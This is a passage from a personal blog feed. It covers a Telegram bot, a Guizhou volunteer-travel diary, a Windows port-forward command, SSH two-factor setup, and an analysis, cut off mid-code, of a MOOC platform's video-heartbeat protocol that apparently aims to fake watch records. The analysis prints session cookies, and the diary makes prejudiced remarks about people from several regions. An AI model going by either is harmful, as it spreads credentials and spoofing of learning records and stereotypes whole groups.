title="Preparation"></a>Preparation</h1><p>PS.  Cause I doesn’t like to deploy a database which may cause private data leaking, So this bot didn’t have any cache and push feature.</p><p>Telegram bot can use two methods to get update from server:</p><ul><li><p>Call  <code>getUpdates</code>  API</p></li><li><p>Set Webhook</p></li></ul><p>According to personal preferrence and Github Stars, I chose <code>python-telegram-bot</code> as my base dependency. But it’s difficult for me to understand its code structure and thinking. At last, I chose <code>pyTelegramBotAPI</code> .</p><hr><p>To use <code>getUpdates</code> API , you have to define a bot instance first. </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> telebotbot <span class="token operator">=</span> telebot<span class="token punctuation">.</span>TeleBot<span class="token punctuation">(</span><span class="token string">"TOKEN"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Then use:</p><pre class="line-numbers language-python"><code class="language-python">bot<span class="token punctuation">.</span>polling<span class="token punctuation">(</span>none_stop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>to get the latest update from user.</p><hr><p>To use Webhook, you must set up your own server to let Telegram Server post data to your server, so that you could do some response to TG’s requests.</p><p>I chose Flask with Python 3.6 to finish this job.</p><p>However, This method will always bind one of those ports:[<strong>443, 80, 88, 8443</strong>]</p><p>But because of fucking CCP, I need to use some of above ports to set up a proxy.</p><p>So I finally didn’t use the <code>setWebhook</code> method.</p><hr><h1 id="Learning"><a href="#Learning" class="headerlink" title="Learning"></a>Learning</h1><p><a href="http://flask-sqlalchemy.pocoo.org/" target="_blank" rel="noopener">http://flask-sqlalchemy.pocoo.org/</a></p><p><a href="http://flask.pocoo.org/docs/0.12/" target="_blank" rel="noopener">http://flask.pocoo.org/docs/0.12/</a></p><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a></p><p><a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">https://core.telegram.org/bots/api</a></p><p><a href="https://github.com/eternnoir/pyTelegramBotAPI" target="_blank" rel="noopener">https://github.com/eternnoir/pyTelegramBotAPI</a></p><p>Just follow the documents and demos.</p><h1 id="While-Coding"><a href="#While-Coding" class="headerlink" title="While Coding"></a>While Coding</h1><p>Recommend: <a href="https://www.bennythink.com/tgbot1.html" target="_blank" rel="noopener">https://www.bennythink.com/tgbot1.html</a></p><p><a href="https://www.bennythink.com/tgbot0.html" target="_blank" rel="noopener">https://www.bennythink.com/tgbot0.html</a></p><p>ReplyKeyboardMarkup should not and cannot use CallbackQuery to proceed data. Just use message ID to identify all messages and then proceed all datas.</p><p>Modulize all features you need, just use <code>pyTelegramBotAPI</code> as an extensible frontend framework. Then introduce all features and commands you need to deal with it.</p><h1 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h1><p><a href="https://github.com/kmahyyg/life-tg-bot" target="_blank" rel="noopener">My BOT Source Code</a> Proudly Hosted on Github.</p><p><a href="https://t.me/lifehap4_yygbot" target="_blank" rel="noopener">My BOT(Limited to internal usage only)</a> Now the hosting is dead, I’m waiting my service provider to fix it.</p><p>BTW, Finally, cooperate with Hermit, I can give up almost all Chinese-made malware APPs. (Only those Chinese-made app:Netease Music, QQ, Wechat, Alipay, Zhihu, Mobike left on my phone, and I almost never use them. Of course, they all downloaded from Google Play Store.)</p><p><strong>Use HTML5&amp;Telegram BOT, NO APP!</strong></p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>Watchdog service and error handler need to be updated. Welcome PR.</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Voluntour to Guizhou - Life is hard</title>
      <link href="/2018/Voluntour-TO-GZ/"/>
      <url>/2018/Voluntour-TO-GZ/</url>
      <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>  PS: 由于旅行期间出现了一些私人事情，导致我的手机不得不进行三清，大部分图片丢失。目前的这些图片来自微信朋友圈。然而，鉴于微信的压缩算法实在垃圾，各位看官将就着看看吧。感谢 <a href="https://sm.ms" target="_blank" rel="noopener">https://sm.ms</a> 提供图床支持。</p><blockquote><p>读书与旅行，二者最美妙的事情，都莫过于和<em>有趣的灵魂</em>相遇。人生路上的风景太多，且行且珍惜。</p></blockquote><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><blockquote><p>读万卷书，不如行万里路。</p></blockquote><p>俗话说的好，“世界这么大，我想去看看。”按耐不住寂寞的我，在这个寒假，乘着“义工旅行”的东风，提前两个月物(bei)色(shua)了很多客栈后，有幸被 <u>西江998一个小小的客栈</u> 收留（主要是很多客栈要姑娘和会做饭，我们这种野生萌新程序猿显然是不行了23333）。<del> 提前透露一点小小的消息：下个假期，目的地 <u>涠洲岛</u> </del> 。就这样，学校放假后便启程前往西江，1月9日，天朗气清，踏上了我的西江之旅。</p><h1 id="Arrival"><a href="#Arrival" class="headerlink" title="Arrival"></a>Arrival</h1><p>经过灰机+汽车颠簸了大半天之后，我到达了此行的目的地：西江千户苗寨。各种攻略软文在此不一一列举，也不重复造轮子，需要的童鞋请自行前往各大网站查看。</p><h2 id="景区简介"><a href="#景区简介" class="headerlink" title="景区简介"></a>景区简介</h2><p>苗寨小北门</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour1.jpg" alt="xbm.jpg"></p><blockquote><h2 id="贵州西江千户苗寨"><a href="#贵州西江千户苗寨" class="headerlink" title="贵州西江千户苗寨"></a>贵州西江千户苗寨</h2><h3 id="地理位置"><a href="#地理位置" class="headerlink" title="地理位置"></a>地理位置</h3><p>西江千户苗寨，位于贵州省黔东南苗族侗族自治州雷山县东北部的雷公山麓，距离县城36千米，距离黔东南州州府凯里35千米，距离省会贵阳市约200千米。由10余个依山而建的自然村寨相连成片，是目前中国乃至全世界最大的苗族聚居村寨。</p><h3 id="地形地貌"><a href="#地形地貌" class="headerlink" title="地形地貌"></a>地形地貌</h3><p>西江千户苗寨所在地形为典型河流谷地，清澈见底的白水河穿寨而过，苗寨的主体位于河流东北侧的河谷坡地上。千百年来，西江苗族同胞在这里日出而耕，日落而息，在苗寨上游地区开辟出大片的梯田，形成了农耕文化与田园风光。</p><h3 id="地理气候"><a href="#地理气候" class="headerlink" title="地理气候"></a>地理气候</h3><p>西江千户苗寨属亚热带湿润山地季风气候，年降水量约1300～1500毫米，年平均气温14～16℃。</p></blockquote><h2 id="客栈简介-未来一个月义工旅行的大本营"><a href="#客栈简介-未来一个月义工旅行的大本营" class="headerlink" title="客栈简介[未来一个月义工旅行的大本营]"></a>客栈简介[未来一个月义工旅行的大本营]</h2><p>到达后，此行目的地客栈的 Boss 浪哥 和 店长 斌哥 热情地在店中接待了我，天气并不是很暖和，店里的炭火却暖暖的、温暖人心。</p><p>上图：</p><p>998客栈大门</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour2.jpg" alt="qunar_998.jpg"></p><p>前台一景</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour3.jpg" alt="998qt.jpg"></p><p>充满艺术感的公共大厅(1)</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour4.jpg" alt="9982.jpg"></p><p>老板浪爷是一个很有艺术格调的人，一个有趣的灵魂，也是一个热情洋溢的人。墙上的画总是不一样，但是每天不变的是一如既往温暖的998。我去的时候正好经历了两任店长交接的过程。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour5.jpg" alt="9983.jpg"></p><p>店铺一角的陈设</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour6.jpg" alt="9984.jpg"></p><p>旁边公共区域大厅的座位，你可以在闲暇时光：沏上一杯热茶，看看书、与掌柜和远道而来的灵魂聊聊天、欣赏苗寨的美丽风光。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour7.jpg" alt="9985.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour8.jpg" alt="998out3.jpg"></p><p>充满文艺气息的客栈一角，老板与老板娘都是美术专业毕业，热爱艺术，热情好客！</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour9.jpg" alt="9986.jpg"></p><p>前台另一个公共区域，在这里你可以享受苗寨西门区域的壮丽景色。与此遥相呼应的是观景台面对的北门景色。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour10.jpg" alt="998out1.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour11.jpg" alt="998out2.jpg"></p><p>998是一家经营了十年的客栈，目前包括998小小的客栈+998偏安一隅两个部分，与幸福里、90年代、北纬27度几家客栈、第三级共建友好联盟。在幸福里，我认识了另一个义工，可爱的静静君（以后不能乱说我想静静了 XD）。而998的老板浪爷正如之上所说，努力为每一个远道而来的朋友在998营造一份家的温暖。在998，每一个朋友都是我们的亲人。</p><h1 id="Daily-Activities"><a href="#Daily-Activities" class="headerlink" title="Daily Activities"></a>Daily Activities</h1><h2 id="Enjoy-Beautiful-Scenery"><a href="#Enjoy-Beautiful-Scenery" class="headerlink" title="Enjoy Beautiful Scenery"></a>Enjoy Beautiful Scenery</h2><p>到达之后，到处浪了几天，大吼：电阻军大法好！某天白天前往了观景台，前店长 小涵 回来之后，我们一起前往观景台之上的上山栈道，累得气喘吁吁。小涵钟情于各种自然精华(eg. 松果)，也是一个性情中人，平日待人和善，也有川妹子的火辣，感谢两位店长一直以来的照顾。</p><p>接下来便开始了每日日常的工作，平日的工作，全靠自己察言观色，仔细认真对待每一件事，慢慢学习，慢慢从不会到会。即使在这样一个地动天寒的一个月里，998依然让我感到暖暖的、很舒服。</p><p>因为我相信：</p><blockquote><p>当你真心诚意地对待每一个人，生活永远不会亏待你。正直向上、心怀感激、诚实守信、乐于助人、认真仔细、用心学习，当你做到这些的时候，光明的未来就在远方。</p></blockquote><h2 id="Orders-and-Customers"><a href="#Orders-and-Customers" class="headerlink" title="Orders and Customers"></a>Orders and Customers</h2><h3 id="曝光一些你们想看的"><a href="#曝光一些你们想看的" class="headerlink" title="曝光一些你们想看的"></a>曝光一些你们想看的</h3><ol><li>景区里内部人士的饭钱 = 公示价 * 0.5~0.6</li><li>客栈老板非常在意网上的评价，请各位文明入住、文明离店！</li><li>各种黄金周期间， 几乎所有东西的价格 = 日常价格 * 2.5</li><li>每一个认真做的客栈，都是热爱与客人同乐的。</li><li>地域黑： 穷山恶水出刁民：贵州、东北人真的很难缠，素质非常低，经常把房间弄得乱糟糟还乱给差评。广东人很矫情。这三个地方低素质人的共同特征是：除了他们自己，其他的都不是人。</li></ol><h3 id="日常"><a href="#日常" class="headerlink" title="日常"></a>日常</h3><h4 id="998的客房钥匙"><a href="#998的客房钥匙" class="headerlink" title="998的客房钥匙"></a>998的客房钥匙</h4><p>998的客房钥匙，可以说也是998的一个特色。998的房间分布在4栋不同的楼中，其中一栋正在装修。其他的三栋的每一间客房的钥匙都是用石头做挂件，每一颗石头都是由前台的义工或者店员去后山的田园观光区河边亲手捡来、手工磨制钻孔，画上一些看起来千奇百怪却别有深意的图案，也为顾客所爱。</p><h4 id="998的前台日常"><a href="#998的前台日常" class="headerlink" title="998的前台日常"></a>998的前台日常</h4><p>每天清晨，起床之后的第一件事，就是去把饮水机加满新鲜的清水。神奇的饮水机提供了我们一天的饮用水。接下来，去仓库夹出一些煤炭，放在煤气灶上，慢慢烧红，再夹到火塘中。为寒冷的冬天提供那么一丝丝的温暖。</p><blockquote><p>实心灰，空心火。</p></blockquote><p>经过某天母亲言传之后，也慢慢掌握了生火的技巧，越来越暖，越来越好。接下来就是隔几个小时去动一动加点炭就好。到了中午过后，客人陆续到达，总会时不时响起“您有新的订单，请及时处理”的提示，夹杂在激动人心的音乐声中，与不时打来的咨询电话声混为一体，颇有气势。时不时也去和客人插科打诨，和前来收送洗被褥或者生活物资的师傅们聊聊他们的生活。每天就在这样的生活中迎接一位又一位远道而来的朋友，重复这一段看似单调却又快乐充实的生活。</p><h1 id="Cold-But-Warm-Those-animals"><a href="#Cold-But-Warm-Those-animals" class="headerlink" title="Cold But Warm - Those animals"></a>Cold But Warm - Those animals</h1><blockquote><p>我总是笑着对静静说：“你们幸福里大概一定是有虐待动物的传统吧。”</p></blockquote><h2 id="豆豆、莎莎和提咪，当然还有小咖"><a href="#豆豆、莎莎和提咪，当然还有小咖" class="headerlink" title="豆豆、莎莎和提咪，当然还有小咖"></a>豆豆、莎莎和提咪，当然还有小咖</h2><p>说起来，这几只小萌物都是幸福里的宠物。但998是他们的另一个家。</p><p>豆豆是幸福里˙醒山的一只喵星人，身长1尺，通体灰黑，怕人。此喵甚爱998，每天一到饭点，便坐在998的饭桌旁“喵喵”交个不停，甚是令人心烦。偶尔摸一摸，她也不会逃跑，只是希望多从你这找点吃的罢了。</p><p>这只喵星人口味很挑，听浪爷说，是吃生肉长大的，所以……她不吃猫粮。某天巨冷的时候，走到专门为她准备的盆面前，闻了闻给她准备的猫粮，便转过头来朝我抗议……(内心十万只羊驼奔过)只好单独切肉给她……</p><p>此喵甚好玩，晚上喜欢躲在火塘旁边和我们一起烤火。等我们上楼睡觉，便跳去火堆旁边，蜷缩一整晚，直到第二天早晨我们起床。</p><p>此喵也甚爱搞事，最爱的地方就是厨房的碗柜和仓库的某个柜子角落，令我做了一个不亦乐乎的铲屎官。某天晚上洗完碗，忘了把碗柜关起来，第二天一早，碗柜里的所有碗猫主子都去光顾了一遍，留下了不少脚印，只好拿出来全部重洗……某天晚上烧烤完过后，剩下了半袋油豆腐块忘了放进冰箱、仓库门也没有关，我的乖乖诶！第二天，油豆腐一点不剩了，仓库角落旁的煤炭上发现了一堆shit……（内心再次十万只羊驼奔过，继续乖乖给主子铲屎）。</p><p>莎莎则是楼下幸福里的一只金毛，不知道为什么，貌似很不受主人待见。每次逗只能依靠在幸福里Voluntour的义工来给她买狗粮，今年五岁的她其实非常听话。早上饿了就去扒静静房间的门。到饭点也不叫，就默默看着我们吃完给她喂狗粮。偶尔实在饿得不行，迫于主人的威慑，也不敢上桌，悄悄观察各位食客谁比较面善，然后用她那脏兮兮的爪子拍拍你，“喂，我饿了！”，然后就一直蹲在那里拍你，直到吃完饭为止。</p><p>某天，静静出门了，幸福里的掌柜让我去溜一溜莎莎。从小就怕狗的我硬着头皮答应了（而且还没有栓链子……）。出门之后就拼命狂奔，遇到路边的小野狗也要闹一会儿，因为那段时间她在发情，为了保证血统纯正，我还要随时盯着她，随时准备把她拉开，防止发生某些不可描述的事情……溜了大概1km左右，她自己生完翔之后便自行掉头了（内心OS：那么聪明的说？）然后又狂奔回去，到了半路，在一家餐馆的厨房门口坐定了（黑人问号？）……坐定了……感谢好心的掌柜，给了我一块骨头，我成功把她引诱回了家:( 差点直接把我扑倒在地……</p><p>提咪则据说是一只其他掌柜托管在幸福里的狗，与莎莎不同，提咪更多的像是一只野生犬类，不给吃得就一直叫，身上脏兮兮的，还会咬人（差评</p><p>小咖，则是90年代掌柜樱桃姐家的一只小doggy，我离开的时候才3个月大，总是乐此不疲地喜欢和人的脚玩耍，你跑到哪，她追到哪。只要是主人/主人的朋友，一定追到你气喘吁吁才灰溜溜跑开。此狗且愚笨且聪明，经常跑到炭火边把自己尾巴烤焦嗷嗷交，却也会躲过主人拦截偷吃大枣，也算是在这寂寞冬天里的一点点乐子了。</p><h1 id="Cold-But-Warm-Those-people"><a href="#Cold-But-Warm-Those-people" class="headerlink" title="Cold But Warm - Those people"></a>Cold But Warm - Those people</h1><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour12.jpg" alt="cold2.jpg"></p><p>在998的一个月里，我经历了西江的寒冬，在旅游淡季的同时迎来了寒潮。在寒潮中，却一直有这样的一些掌柜们与我们共享欢乐。</p><h2 id="Bosses"><a href="#Bosses" class="headerlink" title="Bosses"></a>Bosses</h2><h3 id="浪爷"><a href="#浪爷" class="headerlink" title="浪爷"></a>浪爷</h3><p>998的大boss，艺术基因buff。万能大boss，修得了水管，进得了厨房，妻管严，可以看出超爱璐姐。真的待人非常友好，总想着带着远方的来客一同欢乐，总为我们这些微不足道的义工着想。饭菜备好，美酒美菜呈上，酒过三巡，也拿起吉他，弹唱着自己写的一首又一首曲子。或许，这就是998的灵魂吧。</p><h3 id="樱桃姐"><a href="#樱桃姐" class="headerlink" title="樱桃姐"></a>樱桃姐</h3><p>可以说是此行中最让我感到开心的一位大boss，北漂一枚。可惜作为2017年年末的“低端人口”，回到了西江，开起了90年代，现在已经在装修新店啦，很开心的说:)</p><p>因为北漂的缘故，樱桃姐的思想在很多时候是具有一定的先进性的，给予我很多启发。生活的经历让她和我在一些话题上有了共鸣。她平日和善可亲，每天都开心地训练小咖，可惜，小咖并没有养成出门上厕所的好习惯hhhhh</p><p>樱桃姐在小年的那一天教我包饺子，在平日的生活中和各位义工、朋友们打成一片，给人一种深刻的亲切感，认识了她，也算是不虚此行。</p><h3 id="小王"><a href="#小王" class="headerlink" title="小王"></a>小王</h3><p>幸福里Boss，懒而老奸巨猾，请吃饭永远不算数，叫他吃饭永远在打游戏，好像并不是很喜欢莎莎的说 :( 动物是人类的朋友，不会善待动物，那也别指望能做成什么。[请参考潘石屹与吃猴脑的人的故事]</p><h3 id="Other-Bosses"><a href="#Other-Bosses" class="headerlink" title="Other Bosses"></a>Other Bosses</h3><p>没怎么深入接触，不予置评。总而言之人都很好啦。北纬27Boss张小夜也很棒的说，每天都来998蹭饭XD。涵爷有着川妹子特有的火辣，却也一直在帮助我进步，非常感谢。我第一天到店就见到的斌哥，其实也是一位深藏不漏的大Boss，待人完全没有富人的那副架子，总是带着我玩，给我做了很多好吃的，十分感激！第一次独自出远门能遇到这么多好人，也包容了我很多的缺点与不足，教我不断改善，真的非常开心，谢谢你们！</p><p>只是不太习惯记忆西江度假酒店Boss丁丁那种东北人的感觉，总是抢这抢那的，说好听点叫粗犷，说难听点叫自私。很多时候，抢来抢去，又有什么意思呢？很多东西，学会共享，你会收获更多。并不是所有的东西都需要署名的。</p><h2 id="困难的冰雪一周"><a href="#困难的冰雪一周" class="headerlink" title="困难的冰雪一周"></a>困难的冰雪一周</h2><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour13.jpg" alt="cold.jpg"></p><p>很开心的，我遇到了西江最冷的一周。冷得瑟瑟发抖，晚上要三床被子+一个睡袋才能抵御老式木质吊脚楼阁楼缝隙中呼啸而入的瑟瑟寒风。然后水管直接冻住了，不同的房间供水情况差异很大，每天要为客人提水服务。天气很冷，路上结了厚厚的冰，非常的湿滑，也是非常考验人的毅力。</p><p>与静静一同在全是冰凌的鹅卵石路上一同洒上木屑，看着不得不上山下山的路人没有再次滑倒，内心也就得到了那么一丝做完好事之后的安慰。现在回想起来，也是一段美好的回忆。</p><p>之后天气一周都在零下，等待慢慢解冻的时候，水龙头、水管纷纷爆裂，也就进入了繁忙的修水管一周，都是些琐事，也就不在详细叙述。</p><h1 id="与游客们的邂逅"><a href="#与游客们的邂逅" class="headerlink" title="与游客们的邂逅"></a>与游客们的邂逅</h1><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour14.jpg" alt="night.jpg"></p><p>——与方南小姐姐同行</p><h2 id="观景台一游"><a href="#观景台一游" class="headerlink" title="观景台一游"></a>观景台一游</h2><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour15.jpg" alt="gjt1.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour16.jpg" alt="gjt2.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour17.jpg" alt="gjt3.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour18.jpg" alt="gjt4.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour19.jpg" alt="gjt5.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour20.jpg" alt="gjt6.jpg"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour21.jpg" alt="gjt7.jpg"></p><p>——作为滇蓝RES去摸po的时候拍的，可惜更高处拍的更美的景色被我手机三清弄没了，心塞……</p><p>期间也认识了俊玲姐，也算是开心吧，挺开朗的一个姑娘。</p><h1 id="小年"><a href="#小年" class="headerlink" title="小年"></a>小年</h1><p><img src="https://yygc.zzjnyyz.cn/asset_files/vltour2018/vltour22.jpg" alt="xiaonian1.jpg"></p><p>樱桃姐教我包饺子~ ~ ~ 东北寄来的肉冻~ ~ ~ ，还有浪爷的家传腌菜（未上镜）~ ~ ~</p><p>也算是满足了我的胃了。</p><p>再次给斌哥日常的厨艺点赞，很怀念。</p><h1 id="离别"><a href="#离别" class="headerlink" title="离别"></a>离别</h1><blockquote><p>几日寂寥伤酒后，一番萧瑟禁烟中。<br>鱼书欲寄何由达，水远山长处处同。</p></blockquote><p>走之前最后一晚，大家都喝醉了，浪爷边弹边唱，唱着他自己编的歌。渐渐也听出那一份生活中的辛酸，谢谢大家热情的送别。可惜我订了很早的高铁票，早上便再也没有见到他们了。大家后会有期，我还会再回来的。再见，西江！再见，998！</p>]]></content>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PortForward on WinServer</title>
      <link href="/2017/PortForward-on-WinServer/"/>
      <url>/2017/PortForward-on-WinServer/</url>
      <content type="html"><![CDATA[<pre><code>netsh interface portproxy add v4tov4 listenaddress=INTERFACEIP listenport=LOCALPORT connectaddress=REMOTEIP  connectport=REMOTEPORT</code></pre>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C: Chaintable and Array</title>
      <link href="/2017/C-Chaintable-and-Array/"/>
      <url>/2017/C-Chaintable-and-Array/</url>
      <content type="html"><![CDATA[<p><img src="https://yygc.zzjnyyz.cn/asset_files/c-chaintable.png" alt="Array_Chaintable.png"></p><p><a href="https://www.cnblogs.com/tao560532/articles/2199280.html" target="_blank" rel="noopener">https://www.cnblogs.com/tao560532/articles/2199280.html</a></p><p>一图流，与我交流可以使用评论框或页面底部任意方式。<br>Telegram常年在线。</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Set up Google 2FA for Debian-based OS SSH Authentication</title>
      <link href="/2017/Set-up-Google-2FA-for-Debian-based-OS-SSH-Authentication/"/>
      <url>/2017/Set-up-Google-2FA-for-Debian-based-OS-SSH-Authentication/</url>
      <content type="html"><![CDATA[<h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><ol><li>Debian-based system</li><li>Two conneced SSH sessions at the same machine to prevent from failure<pre><code>    ** This machine should have a configured publickey auth method. **</code></pre></li><li>A Phone with 2FA app installed (recommend Authy)</li><li>A safe place to save recovery code</li></ol><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre class="line-numbers language-sh"><code class="language-sh">sudo apt-get update -ysudo apt-get install libpam-google-authenticator -ygoogle-authenticator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Configuration-of-Authenticator"><a href="#Configuration-of-Authenticator" class="headerlink" title="Configuration of Authenticator"></a>Configuration of Authenticator</h2><p>Follow the screen notification to input and save your recovery key.</p><p>Normally it should be: “Y” -&gt; Save your Recovery key -&gt; “Y” -&gt; “N” -&gt; “Y”</p><p>This config is highly-recommended.</p><h2 id="Configuration-of-PAM-and-SSH"><a href="#Configuration-of-PAM-and-SSH" class="headerlink" title="Configuration of PAM and SSH"></a>Configuration of PAM and SSH</h2><p>Edit <code>/etc/pam.d/sshd</code>to enable the Google 2FA in PAM.</p><pre><code>(At the top of the file)# Standard Un*x authentication.#@include common-auth       // Comment this line......(At the bottom of the file)# Standard Un*x password updating.@include common-passwordauth required pam_google_authenticator.so nullok   //Add this Line here</code></pre><p>Then edit the <code>/etc/ssh/sshd_config</code> to enable the force 2FA.</p><pre><code>......# Change to yes to enable challenge-response passwords (beware issues with# some PAM modules and threads)ChallengeResponseAuthentication yes    // Change from no to yes......UsePAM yes      // Ensure Here is &quot;yes&quot;AuthenticationMethods publickey,keyboard-interactive   // Add this line here......</code></pre><h1 id="Done"><a href="#Done" class="headerlink" title="Done!"></a>Done!</h1><p>Congratulaions! You’ve already configured it!</p><p>Try reconnect using another session!</p><p>If there’s anything wrong, Search Google or leave a message here. Then use the connected session to change the config back.</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>学堂在线 MOOC 视频观看系统分析</title>
      <link href="/2017/Analysis-of-xuetangx/"/>
      <url>/2017/Analysis-of-xuetangx/</url>
      <content type="html"><![CDATA[<p>学堂在线 MOOC 视频观看系统分析</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>基础地址： <a href="http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/" target="_blank" rel="noopener">http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/</a></p></blockquote><blockquote><p>鸣谢： <a href="https://github.com/wangqr/proto_xuetangx" target="_blank" rel="noopener">https://github.com/wangqr/proto_xuetangx</a></p></blockquote><p>因为学校垃圾校园网闪断问题频发，加上学堂在线 MOOC 系统设计存在重大缺陷，导致经常性无法正常记录学生的观看记录。</p><p>人懒，遂操起工具，分析视频观看记录系统。</p><h1 id="加载页面"><a href="#加载页面" class="headerlink" title="加载页面"></a>加载页面</h1><p>加载页面常用 JS、CSS、HTML 完成，看到是自己写的成绩记录系统 + XHR动态刷新 + OpenEDX 魔改而成。</p><p>加载完成后 访问  <a href="http://ynu.xuetangx.com/event" target="_blank" rel="noopener">http://ynu.xuetangx.com/event</a> ，然后 POST 一个 CDN_PREF数据到此处获取视频ID并加载视频，这里并不重要</p><h1 id="播放视频全过程"><a href="#播放视频全过程" class="headerlink" title="播放视频全过程"></a>播放视频全过程</h1><h2 id="心跳包解构"><a href="#心跳包解构" class="headerlink" title="心跳包解构"></a>心跳包解构</h2><h3 id="基础：浏览器环境"><a href="#基础：浏览器环境" class="headerlink" title="基础：浏览器环境"></a>基础：浏览器环境</h3><p>浏览器 Request Header：</p><pre><code>Accept:*/*Accept-Encoding:gzip, deflateAccept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie:UM_distinctid=1601d25d955992-041780ba866e8-102c1709-1fa400-1601d25d9561182; _spoc_lms_cms_sessionid=8a1bc8065611bd8d6d347b9ae538f14f; _log_user_id=15490f8b4640272d3085687db3630f8aDNT:1Host:log.xuetangx.comProxy-Connection:keep-aliveReferer:http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</code></pre><p>Response Header :</p><pre><code>Connection:keep-aliveContent-Length:7Content-Type:application/octet-streamContent-Type:application/jsonDate:Tue, 05 Dec 2017 12:35:29 GMTServer:nginxVia:1.1 ubuntu (squid/3.3.8)X-Cache:MISS from ubuntuX-Cache-Lookup:MISS from ubuntu:3128</code></pre><h3 id="Heartbeat"><a href="#Heartbeat" class="headerlink" title="Heartbeat"></a>Heartbeat</h3><h4 id="起始播放"><a href="#起始播放" class="headerlink" title="　起始播放"></a>　起始播放</h4><p>Base URL: <code>http://log.xuetangx.com/heartbeat</code><br>方式： POST</p><pre><code>i:5                         // 心跳间隔： 5set:play                                  // 操作类型：play/seeking/pause/videoend/heartbeatp:web　　　　　　　　// 终端：web/androidcp:0                                       //发生此行为的视频地址fp:0                    //拖拽起始tp:0                    //拖拽终止sp:1.5                    //播放倍速ts:1512477329562　　　// 当前用户系统时间u:7717027                            //用户IDc:course-v1:TsinghuaX+y10_010610183_2X+2017_T2          // 课程IDv:6e9bf023d8cf4744b7add14a3ab932d8                                 //课程结构中的视频IDcc:B304B0428B631CD59C33DC5901307461　　　　　　//CC上存储的视频IDd:519.4　　　　　　　　　　　//视频时长pg:6e9bf023d8cf4744b7add14a3ab932d8_16uiv     //页面编号sq:1                    // 操作序号：自增IDcallback:c　　　　　　  //无意义：回调值恒为ｃ_:1512477329564        //猜测是服务器时间戳，与系统时间戳+1/0</code></pre><p>需要注意一点：　　页面编号: </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> salt <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span 